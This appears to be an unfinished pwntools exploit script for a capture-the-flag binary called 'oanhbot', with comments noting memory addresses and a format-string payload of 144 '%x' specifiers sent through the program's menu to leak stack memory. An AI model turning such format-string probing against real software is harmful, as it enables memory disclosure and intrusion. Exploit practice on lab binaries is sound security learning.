from pwn import*

#first read_buf = *0x603280 hero_name 
#Our_hero's damage =*0x603290
#choose who to kill = 0x400bc9 


0x603260

r = process('./oanhbot')
padding = '%x'*144


r.sendafter('Name of your Hero: ','')
r.send("aaaaa")
r.sendafter('Your Choice: ',str(5))
pause()
r.send('a'*16)
pause()
r.send('Y')
r.sendafter('Status: ',padding)

r.interactive()






